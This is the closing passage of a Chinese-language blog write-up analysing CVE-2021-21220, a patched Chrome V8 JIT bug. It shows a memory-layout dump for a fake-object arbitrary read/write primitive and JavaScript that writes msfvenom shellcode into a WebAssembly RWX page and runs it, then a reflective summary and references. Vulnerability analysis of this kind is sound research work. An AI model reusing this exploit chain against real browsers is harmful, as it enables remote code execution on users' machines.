<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00:0000│  0x1fa7082aaea0 ◂— 0x804222d082439f1				; arr_map</span><br><span class="line">01:0008│  0x1fa7082aaea8 ◂— 0x8082aaeb9					    ; arr_length + arr_elements_addr</span><br><span class="line">02:0010│  0x1fa7082aaeb0 ◂— 0x8213bc5080455b9				</span><br><span class="line">03:0018│  0x1fa7082aaeb8 ◂— 0x808042a95					    ; arr_elements_map			</span><br><span class="line">04:0020│  0x1fa7082aaec0 ◂— 0x804222d082439f1				;fake_map								arr2[0]</span><br><span class="line">05:0028│  0x1fa7082aaec8 ◂— 0x3ff3333333333333				;fake_length + fake_element_addr		  arr2[1]</span><br><span class="line">06:0030│  0x1fa7082aaed0 ◂— 0x4002666666666666				</span><br><span class="line">07:0038│  0x1fa7082aaed8 ◂— 0x400b333333333333 (&#x27;333333\x0b@&#x27;)</span><br></pre></td></tr></table></figure>

<p>个人对上述的推理过程如下：</p>
<p>[0x28] == (2n &lt;&lt; 32n) + addr - 8n</p>
<p>arr2[1]  -&gt; [0x0+0x8]+0x8+0x8 -&gt; 0x18+0x8+0x8 -&gt; 0x28</p>
<p>fake[0] -&gt; [0x20+0x8]+0x8 -&gt;  (2n &lt;&lt; 32n) + addr - 8n+0x8 -&gt; (2n &lt;&lt; 32n) + addr</p>
<p>这样就可以通过操作fake[0]来进行任意地址读写。</p>
<h5 id="4-wasm利用"><a href="#4-wasm利用" class="headerlink" title="(4)wasm利用"></a>(4)wasm利用</h5><p>这里就是因为wasm会生成一块rwx空间，通过向该空间写入shellcode并调用达到命令执行的目的。</p>
<p>代码如下</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//msfvenom -p linux/x64/exec CMD=whoami -f num</span></span><br><span class="line"><span class="keyword">let</span> shellcode = [<span class="number">0x6a</span>, <span class="number">0x3b</span>, <span class="number">0x58</span>, <span class="number">0x99</span>, <span class="number">0x48</span>, <span class="number">0xbb</span>, <span class="number">0x2f</span>, <span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x2f</span>, <span class="number">0x73</span>, <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="number">0x53</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe7</span>, <span class="number">0x68</span>, <span class="number">0x2d</span>, <span class="number">0x63</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="number">0x52</span>, <span class="number">0xe8</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x77</span>, <span class="number">0x68</span>, <span class="number">0x6f</span>, <span class="number">0x61</span>, <span class="number">0x6d</span>, <span class="number">0x69</span>, <span class="number">0x00</span>, <span class="number">0x56</span>, <span class="number">0x57</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>];</span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> buf2 = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x150</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">copy_shellcode</span>(<span class="params">addr, shellcode</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> dataview = <span class="keyword">new</span> <span class="built_in">DataView</span>(buf2);</span><br><span class="line">    <span class="keyword">let</span> buf_addr = addressOf(buf2);</span><br><span class="line">    <span class="keyword">let</span> backing_store_addr = buf_addr + <span class="number">0x14n</span>;</span><br><span class="line">    arbwrite(backing_store_addr, addr);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.length; i++) &#123;</span><br><span class="line">        dataview.setUint8(i, shellcode[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> rwx_page_addr = f2big(arbread(addressOf(wasmInstance) + <span class="number">0x68n</span>));                </span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[+] Address of rwx page: &quot;</span> + rwx_page_addr.toString(<span class="number">16</span>));</span><br><span class="line">copy_shellcode(rwx_page_addr, shellcode);</span><br><span class="line">f();</span><br></pre></td></tr></table></figure>

<p>最终复现如下</p>
<p><img src="/2021/04/30/CVE-2021-21220/image-20210427231450948.png" alt="image-20210427231450948"></p>
<h3 id="3、漏洞修复"><a href="#3、漏洞修复" class="headerlink" title="3、漏洞修复"></a>3、漏洞修复</h3><p>issue 1196683</p>
<h2 id="四、总结与思考"><a href="#四、总结与思考" class="headerlink" title="四、总结与思考"></a>四、总结与思考</h2><p>该漏洞分析是个人的第一个Chrome的真实漏洞分析，所以过程会比较详细，但是详细不意味着面面俱到。我始终相信，二进制漏洞分析真实的调试一定是必不可少的，我想要表达的一些东西都存在于调试信息中了，自然就没有必要进行过多的文字陈述。</p>
<p>由于JIT优化机制的存在，出现类似于这种类型的漏洞一定还是存在的，但是这种漏洞是无法绕过沙箱的，所以用户开启沙箱使用浏览器可以在很大程度上防止恶意代码的攻击，但仍有一些漏洞是可以绕过沙箱对宿主机进行攻击，这就需要我们对不明链接保持谨慎的习惯，这样就可以很好的避免0day浏览器漏洞对我们的损害。</p>
<p>该文章的成型参考了很多篇优秀的文章[123]，感谢师傅们的开源精神，我也会将更多我的漏洞分析过程公开出来，为技术分享的氛围贡献一点绵薄之力。</p>
<h2 id="五、参考"><a href="#五、参考" class="headerlink" title="五、参考"></a>五、参考</h2><p>[1]. <a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/O81Kw-ujcbjY_1S6dFKpxQ" >https://mp.weixin.qq.com/s/O81Kw-ujcbjY_1S6dFKpxQ<i class="fas fa-external-link-alt"></i></a></p>
<p>[2]. <a class="link"   target="_blank" rel="noopener" href="https://github.com/r4j0x00/exploits/tree/master/chrome-0day" >https://github.com/r4j0x00/exploits/tree/master/chrome-0day<i class="fas fa-external-link-alt"></i></a></p>
<p>[3]. <a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/yeu9IZSNrp1f_lK5oIdL9A" >https://mp.weixin.qq.com/s/yeu9IZSNrp1f_lK5oIdL9A<i class="fas fa-external-link-alt"></i></a></p>
<p>[4]. <a class="link"   target="_blank" rel="noopener" href="https://www.ecma-international.org/publications-and-standards/standards/ecma-262/" >https://www.ecma-international.org/publications-and-standards/standards/ecma-262/<i class="fas fa-external-link-alt"></i></a></p>
<p>[5]. <a class="link"   target="_blank" rel="noopener" href="https://v8.dev/blog/elements-kinds" >https://v8.dev/blog/elements-kinds<i class="fas fa-external-link-alt"></i></a></p>
<p>[6]. <a class="link"   target="_blank" rel="noopener" href="https://googleprojectzero.blogspot.com/2021/01/in-wild-series-chrome-infinity-bug.html" >https://googleprojectzero.blogspot.com/2021/01/in-wild-series-chrome-infinity-bug.html<i class="fas fa-external-link-alt"></i></a></p>
<p>[7]. <a class="link"   target="_blank" rel="noopener" href="https://bugs.chromium.org/p/v8/issues/detail?id=6380" >https://bugs.chromium.org/p/v8/issues/detail?id=6380<i class="fas fa-external-link-alt"></i></a></p>
<p>[8]. <a class="link"   target="_blank" rel="noopener" href="https://blog.infosectcbr.com.au/2020/02/pointer-compression-in-v8.html" >https://blog.infosectcbr.com.au/2020/02/pointer-compression-in-v8.html<i class="fas fa-external-link-alt"></i></a></p>
<p>[9]. <a class="link"   target="_blank" rel="noopener" href="https://v8.dev/blog/pointer-compression" >https://v8.dev/blog/pointer-compression<i class="fas fa-external-link-alt"></i></a></p>

        </div>

        

        

        
            <div class="article-nav">
                
                    <div class="article-prev">
                        <a class="prev"
                           rel="prev"
                           href="/2021/05/12/CVE-2021-21224/"
                        >
                            <span class="left arrow-icon flex-center">
                              <i class="fas fa-chevron-left"></i>
                            </span>
                            <span class="title flex-center">
                                <span class="post-nav-title-item">CVE-2021-21224</span>
                                <span class="post-nav-item">Prev posts</span>
                            </span>
                        </a>
                    </div>
                
                
                    <div class="article-next">
                        <a class="next"
                           rel="next"
                           href="/2021/04/21/starctf2019-oob/"
                        >
                            <span class="title flex-center">
                                <span class="post-nav-title-item">starctf2019-oob</span>
                                <span class="post-nav-item">Next posts</span>
                            </span>
                            <span class="right arrow-icon flex-center">
                              <i class="fas fa-chevron-right"></i>
                            </span>
                        </a>
                    </div>
                
            </div>
        

        
            <div class="comment-container">
                <div class="comments-container">
    <div id="comment-anchor"></div>
    <div class="comment-area-title">
        <i class="fas fa-comments">&nbsp;Comments</i>
    </div>
    

        
            
    <div class="valine-container">
        <script 
                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
        <div id="vcomments"></div>
        <script >
            function loadValine() {
                new Valine({
                    el: '#vcomments',
                    appId: 'oP8c99sduOuJjyeVoKafuweh-gzGzoHsz',
                    appKey: 'TwXXvHbKxF0DVsXV22S2uRVG',
                    meta: ['nick', 'mail', 'link'],
                    avatar: 'wavatar',
                    enableQQ: true,
                    placeholder: '欢迎大家吐槽~',
                    lang: 'en'.toLowerCase()
                });

                function getAuthor(language) {
                    switch (language) {
                        case 'en':
                            return 'Author';
                        case 'zh-CN':
                            return '博主';
                        default:
                            return 'Master';
                    }
                }

                // Add "Author" identify
                const getValineDomTimer = setInterval(() => {
                    const vcards = document.querySelectorAll('#vcomments .vcards .vcard');
                    if (vcards.length > 0) {
                        let author = 'fa1lr4in';

                        if (author) {
                            for (let vcard of vcards) {
                                const vnick_dom = vcard.querySelector('.vhead .vnick');
                                const vnick = vnick_dom.innerHTML;
                                if (vnick === author) {
                                    vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
                                }
                            }
                        }
                        clearInterval(getValineDomTimer);
                    } else {
                        clearInterval(getValineDomTimer);
                    }
                }, 2000);
            }

            if ('false') {
                const loadValineTimeout = setTimeout(() => {
                    loadValine();
                    clearTimeout(loadValineTimeout);
                }, 1000);
            } else {
                window.addEventListener('DOMContentLoaded', loadValine);
            }
        </script>
    </div>



        
    
</div>

            </div>
        
    </div>
</div>


                
            </div>

        </div>

        <div class="page-main-content-bottom">
            <footer class="footer">
    <div class="info-container">
        <div class="copyright-info info-item">
            &copy;
            
              <span>2020</span>
              -
            
            2022&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">fa1lr4in</a>
        </div>
        
            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="website-count info-item">
                
                    <span id="busuanzi_container_site_uv">
                        Visitor Count&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
                    </span>
                
                
                    <span id="busuanzi_container_site_pv">
                        Totalview&nbsp;<span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="theme-info info-item">
            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.5</a>
        </div>
        
        
    </div>
</footer>

        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="tools-list">
        <!-- TOC aside toggle -->
        
            <li class="tools-item page-aside-toggle">
                <i class="fas fa-outdent"></i>
            </li>
        

        <!-- go comment -->
        
            <li class="go-comment">
                <i class="fas fa-comment"></i>
            </li>
        
    </ul>
</div>

        </div>
    

    <div class="right-bottom-side-tools">
        <div class="side-tools-container">
    <ul class="side-tools-list">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <li class="tools-item tool-expand-width flex-center">
            <i class="fas fa-arrows-alt-h"></i>
        </li>

        <li class="tools-item tool-dark-light-toggle flex-center">
            <i class="fas fa-moon"></i>
        </li>

        <!-- rss -->
        
            <li class="tools-item rss flex-center">
                <a class="flex-center"
                   href="/atom.xml"
                   target="_blank"
                >
                    <i class="fas fa-rss"></i>
                </a>
            </li>
        

        

        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list">
        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>
        
            <li class="tools-item tool-scroll-to-top flex-center">
                <i class="arrow-up fas fa-arrow-up"></i>
                <span class="percent"></span>
            </li>
        
    </ul>
</div>

    </div>

    
        <aside class="page-aside">
            <div class="post-toc-wrap">
    <div class="post-toc">
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#V8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="nav-text">V8远程代码执行漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF"><span class="nav-text">一、漏洞信息</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81%E6%BC%8F%E6%B4%9E%E7%AE%80%E8%BF%B0"><span class="nav-text">1、漏洞简述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E3%80%81%E7%BB%84%E4%BB%B6%E5%92%8C%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="nav-text">2、组件和漏洞概述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3%E3%80%81%E7%9B%B8%E5%85%B3%E9%93%BE%E6%8E%A5"><span class="nav-text">3、相关链接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4%E3%80%81%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88"><span class="nav-text">4、解决方案</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-text">二、漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">1、环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E3%80%81%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B"><span class="nav-text">2、复现过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">三、漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="nav-text">1、基本信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E3%80%81%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AF%86"><span class="nav-text">2、背景知识</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%881%EF%BC%89array-shift-tq"><span class="nav-text">（1）array-shift.tq</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%882%EF%BC%89smi"><span class="nav-text">（2）smi</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%883%EF%BC%89%E5%B8%B8%E8%A7%81%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84"><span class="nav-text">（3）常见数据结构</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%B5%AE%E7%82%B9%E5%9E%8B%E6%95%B0%E7%BB%84"><span class="nav-text">浮点型数组</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E2%80%9Csmi%E6%95%B0%E7%BB%84%E2%80%9D"><span class="nav-text">“smi数组”</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-%E6%8C%87%E9%92%88%E5%8E%8B%E7%BC%A9"><span class="nav-text">(4)指针压缩</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3%E3%80%81%E8%A1%A5%E4%B8%81%E5%AF%B9%E6%AF%94"><span class="nav-text">3、补丁对比</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4%E3%80%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">4、漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%881%EF%BC%89POC%E5%88%86%E6%9E%90"><span class="nav-text">（1）POC分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%882%EF%BC%89%E6%89%A7%E8%A1%8C%E6%B5%81%E5%88%86%E6%9E%90"><span class="nav-text">（2）执行流分析</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#SimplifiedLowering"><span class="nav-text">SimplifiedLowering</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#MachineOperatorOptimization"><span class="nav-text">MachineOperatorOptimization</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%883%EF%BC%89%E5%8A%A8%E6%80%81%E9%AA%8C%E8%AF%81"><span class="nav-text">（3）动态验证</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%884%EF%BC%89EXP%E6%9E%84%E9%80%A0"><span class="nav-text">（4）EXP构造</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%EF%BC%881%EF%BC%89%E6%9E%84%E9%80%A0%E8%B6%85%E9%95%BF%E6%95%B0%E7%BB%84"><span class="nav-text">（1）构造超长数组</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%EF%BC%882%EF%BC%89addressOf%E5%92%8CfakeObject%E5%AE%9E%E7%8E%B0"><span class="nav-text">（2）addressOf和fakeObject实现</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%EF%BC%883%EF%BC%89%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%86%99%E5%8E%9F%E8%AF%AD%E5%AE%9E%E7%8E%B0"><span class="nav-text">（3）任意读写原语实现</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-wasm%E5%88%A9%E7%94%A8"><span class="nav-text">(4)wasm利用</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3%E3%80%81%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="nav-text">3、漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81%E6%80%BB%E7%BB%93%E4%B8%8E%E6%80%9D%E8%80%83"><span class="nav-text">四、总结与思考</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81%E5%8F%82%E8%80%83"><span class="nav-text">五、参考</span></a></li></ol></li></ol>
    </div>
</div>
        </aside>
    

    <div class="image-viewer-container">
    <img src="">
</div>


    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fas fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="Search..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="popup-btn-close">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

</main>



<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/dark-light-toggle.js"></script>


    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/local-search.js"></script>



    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/code-copy.js"></script>




<div class="post-scripts">
    
        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/left-side-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/toc.js"></script>
    
</div>



</body>
</html>
